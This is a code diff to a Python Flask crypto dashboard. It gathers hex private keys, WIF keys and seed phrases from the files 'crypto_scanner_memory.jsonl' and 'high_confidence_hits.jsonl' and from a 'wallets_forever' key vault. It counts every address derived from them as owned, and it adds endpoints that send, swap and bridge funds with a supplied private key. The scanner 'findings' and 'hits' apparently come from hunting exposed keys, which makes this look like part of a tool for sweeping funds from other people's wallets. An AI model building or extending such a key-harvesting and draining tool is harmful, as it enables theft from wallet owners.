+      5. LIVE crypto_scanner derive from every hex_key/wif/seed in wallets_forever
+
+    This is the single source of truth for "do I own this address?".
+    If an address cannot be traced to a private key we possess, it is NOT keyed.
     """
     now = time.time()
     if now - _keyed_cache["ts"] < 45 and _keyed_cache["addrs"]:
         return _keyed_cache["addrs"]
     addrs: set = set()
+
+    # --- Source 1+2: wallets_forever.db (persistent key vault) ---
     try:
         import sqlite3
         wf = HOME / "wallets_forever.db"
@@ -471,7 +659,6 @@ def _keyed_address_set() -> set:
                 if ad:
                     addrs.add(_norm_addr(str(ad)))
                     addrs.add(str(ad).lower())
-            # also collect from raw_json in case index lagged
             if len(addrs) < 100:
                 for (raw,) in c.execute("SELECT raw_json FROM wallets"):
                     try:
@@ -486,6 +673,8 @@ def _keyed_address_set() -> set:
             c.close()
     except Exception:
         pass
+
+    # --- Source 3: balance_cache derivations ---
     try:
         import sqlite3
         bdb = HOME / "balance_cache.db"
@@ -501,6 +690,147 @@ def _keyed_address_set() -> set:
             c.close()
     except Exception:
         pass
+
+    # --- Source 4: LIVE derive from scanner memory hex_keys/wifs/seeds ---
+    try:
+        import crypto_scanner as _cs_live
+        hc = HOME / "high_confidence_hits.jsonl"
+        mem = HOME / "crypto_scanner_memory.jsonl"
+        hex_keys_set: set = set()
+        wifs_set: set = set()
+        seeds_set: set = set()
+        for path in (hc, mem):
+            if not path.exists():
+                continue
+            try:
+                size = path.stat().st_size
+                with open(path, "rb") as bf:
+                    if size > 6_000_000:
+                        bf.seek(max(0, size - 6_000_000))
+                        bf.readline()
+                    text = bf.read().decode("utf-8", errors="ignore")
+                for line in reversed(text.splitlines()):
+                    if not line or len(line) > 256_000:
+                        continue
+                    try:
+                        rec = json.loads(line)
+                    except Exception:
+                        continue
+                    f = rec.get("findings") if isinstance(rec.get("findings"), dict) else None
+                    if f is None:
+                        continue
+                    w = f.get("wallet") if isinstance(f.get("wallet"), dict) else {}
+                    for hk in (w.get("hex_keys") or []):
+                        hkx = (hk or "").strip().lower().replace("0x", "")
+                        if len(hkx) == 64 and hkx not in hex_keys_set:
+                            hex_keys_set.add(hkx)
+                    for wk in (w.get("wifs") or []):
+                        wks = (wk or "").strip()
+                        if len(wks) >= 50 and wks not in wifs_set:
+                            wifs_set.add(wks)
+                    for sk in (w.get("seed_phrases") or []):
+                        sks = (sk or "").strip()
+                        if sks and sks not in seeds_set:
+                            seeds_set.add(sks)
+                    if len(hex_keys_set) + len(wifs_set) + len(seeds_set) >= 2000:
+                        break
+            except Exception:
+                pass
+
+        derived_count = 0
+        max_derive = 800
+        for hkx in list(hex_keys_set):
+            if derived_count >= max_derive:
+                break
+            try:
+                raw = bytes.fromhex(hkx)
+                if any(raw[i] == 0 for i in range(min(8, len(raw)))) or raw == b"\x00" * 32:
+                    continue
+                from crypto_iq import is_junk_hex as _junk
+                if _junk and _junk(hkx):
+                    continue
+            except Exception:
+                pass
+            try:
+                raw = bytes.fromhex(hkx)
+                derived = _cs_live.priv_to_addresses(raw) or {}
+            except Exception:
+                continue
+            derived_count += 1
+            for _ch, addr in derived.items():
+                if addr:
+                    addrs.add(_norm_addr(str(addr)))
+                    addrs.add(str(addr).lower())
+
+        for wk in list(wifs_set):
+            if derived_count >= max_derive:
+                break
+            try:
+                p = _cs_live.wif_to_priv_bytes(wk)
+                if p:
+                    derived = _cs_live.priv_to_addresses(p) or {}
+                    derived_count += 1
+                    for _ch, addr in derived.items():
+                        if addr:
+                            addrs.add(_norm_addr(str(addr)))
+                            addrs.add(str(addr).lower())
+            except Exception:
+                pass
+
+        for sk in list(seeds_set):
+            if derived_count >= max_derive:
+                break
+            try:
+                derived = _cs_live.seed_to_addresses(sk) or {}
+                derived_count += 1
+                for _ch, addr in derived.items():
+                    if addr:
+                        addrs.add(_norm_addr(str(addr)))
+                        addrs.add(str(addr).lower())
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+    # --- Source 5: LIVE derive from wallets_forever hex/wif/seed keys ---
+    try:
+        import sqlite3, crypto_scanner as _cs2
+        wf = HOME / "wallets_forever.db"
+        if wf.exists() and len(addrs) < 500:
+            c = sqlite3.connect(str(wf), timeout=8)
+            rows = c.execute(
+                "SELECT key_type, key_value FROM wallets WHERE key_type IN ('hex','wif','seed') LIMIT 300"
+            ).fetchall()
+            c.close()
+            for kt, kv in rows:
+                if not kv:
+                    continue
+                try:
+                    if kt == "hex":
+                        hkx = kv.strip().lower().replace("0x", "")
+                        if len(hkx) != 64:
+                            continue
+                        raw = bytes.fromhex(hkx)
+                        derived = _cs2.priv_to_addresses(raw) or {}
+                    elif kt == "wif":
+                        p = _cs2.wif_to_priv_bytes(kv.strip())
+                        if p:
+                            derived = _cs2.priv_to_addresses(p) or {}
+                        else:
+                            continue
+                    elif kt == "seed":
+                        derived = _cs2.seed_to_addresses(kv.strip()) or {}
+                    else:
+                        continue
+                    for _ch, addr in derived.items():
+                        if addr:
+                            addrs.add(_norm_addr(str(addr)))
+                            addrs.add(str(addr).lower())
+                except Exception:
+                    continue
+    except Exception:
+        pass
+
     _keyed_cache["ts"] = now
     _keyed_cache["addrs"] = addrs
     return addrs
@@ -1102,6 +1432,114 @@ def api_send():
     except Exception as exc:
         # Last-resort JSON — never let Flask render HTML to the dashboard
         return _api_error(f"{type(exc).__name__}: {exc}", 500)
+
+
+# ── Multichain endpoints (send/swap/bridge/receive) ──────────────────
+
+@app.route("/api/send-multi", methods=["POST"])
+def api_send_multi():
+    """Send on any chain via multichain engine."""
+    try:
+        body = request.get_json(force=True, silent=True) or {}
+    except Exception:
+        body = {}
+    priv_key = (body.get("private_key") or body.get("key") or "").strip()
+    to_addr = (body.get("to") or "").strip()
+    amount = body.get("amount", body.get("value_eth"))
+    chain = (body.get("chain") or "eth").strip().lower()
+    if not priv_key or not to_addr or amount is None:
+        return _api_error("Missing private_key, to, or amount", 400)
+    try:
+        result = mc.send(chain, priv_key, to_addr, float(amount))
+    except Exception as e:
+        return _api_error(str(e), 500)
+    return jsonify(result)
+
+
+@app.route("/api/swap/quote")
+def api_swap_quote():
+    """Get swap quote from 0x (EVM) or Jupiter (Solana)."""
+    chain = request.args.get("chain", "eth").strip().lower()
+    from_token = request.args.get("from_token", "ETH").strip()
+    to_token = request.args.get("to_token", "USDC").strip()
+    amount = request.args.get("amount", type=float)
+    from_addr = request.args.get("from_addr", "").strip()
+    slippage = request.args.get("slippage", 0.01, type=float)
+    if not amount or not from_addr:
+        return _api_error("Missing amount or from_addr", 400)
+    try:
+        result = mc.get_swap_quote(chain, from_token, to_token, amount, from_addr, slippage)
+    except Exception as e:
+        return _api_error(str(e), 500)
+    return jsonify(result)
+
+
+@app.route("/api/swap/execute", methods=["POST"])
+def api_swap_execute():
+    """Execute a swap using a quote from /api/swap/quote."""
+    try:
+        body = request.get_json(force=True, silent=True) or {}
+    except Exception:
+        body = {}
+    chain = (body.get("chain") or "eth").strip().lower()
+    priv_key = (body.get("private_key") or "").strip()
+    quote = body.get("quote", {})
+    if not priv_key or not quote:
+        return _api_error("Missing private_key or quote", 400)
+    try:
+        result = mc.execute_swap(chain, priv_key, quote)
+    except Exception as e:
+        return _api_error(str(e), 500)
+    return jsonify(result)
+
+
+@app.route("/api/bridge/quote")
+def api_bridge_quote():
+    """Get cross-chain bridge quote from LI.FI."""
+    from_chain = request.args.get("from_chain", "eth").strip().lower()
+    to_chain = request.args.get("to_chain", "base").strip().lower()
+    from_token = request.args.get("from_token", "ETH").strip()
+    to_token = request.args.get("to_token", "ETH").strip()
+    amount = request.args.get("amount", type=float)
+    from_addr = request.args.get("from_addr", "").strip()
+    if not amount or not from_addr:
+        return _api_error("Missing amount or from_addr", 400)
+    try:
+        result = mc.get_bridge_quote(from_chain, to_chain, from_token, to_token, amount, from_addr)
+    except Exception as e:
+        return _api_error(str(e), 500)
+    return jsonify(result)
+
+
+@app.route("/api/receive", methods=["POST"])
+def api_receive():
+    """Derive all chain addresses from a private key."""
+    try:
+        body = request.get_json(force=True, silent=True) or {}
+    except Exception:
+        body = {}
+    priv_key = (body.get("private_key") or body.get("key") or "").strip()
+    if not priv_key:
+        return _api_error("Missing private_key", 400)
+    try:
+        result = mc.get_all_addresses(priv_key)
+    except Exception as e:
+        return _api_error(str(e), 500)
+    return jsonify(result)
+
+
+@app.route("/api/balance-live")
+def api_balance_live():
+    """Get live balance for an address on any chain via multichain."""
+    chain = request.args.get("chain", "eth").strip().lower()
+    address = request.args.get("address", "").strip()
+    if not address:
+        return _api_error("Missing address", 400)
+    try:
+        result = mc.get_balance(chain, address)
+    except Exception as e:
+        return _api_error(str(e), 500)
+    return jsonify(result)
 
 
 # ── Main ─────────────────────────────────────────────────────────────
